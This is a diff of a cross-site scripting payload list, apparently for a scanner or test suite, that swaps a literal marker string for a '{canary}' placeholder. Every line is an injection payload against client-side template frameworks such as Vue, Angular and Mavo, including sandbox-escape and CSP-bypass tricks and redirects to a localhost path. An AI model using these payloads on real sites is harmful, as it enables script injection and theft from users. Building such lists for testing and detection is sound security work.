@@ -1,10 +1,10 @@
 "><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
 <a data-mv-if='1 or self.alert(1)'>test</a>
 <a href=[javascript&':alert(1)']>test</a>
-<div data-mv-expressions="lolx lolx">lolxself.alert('ElectricYellow')lolx</div>
+<div data-mv-expressions="lolx lolx">lolxself.alert('{canary}')lolx</div>
 <div mv-expressions="{{ }}">{{top.alert(1)}}</div>
 <div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' :d.location='//localhost/mH/'"></textarea></div>
-<input ng-focus=$event.view.alert('ElectricYellow')>
+<input ng-focus=$event.view.alert('{canary}')>
 [''=''or self.alert(lol)]
 [(1,alert)(1)]
 [7*7]
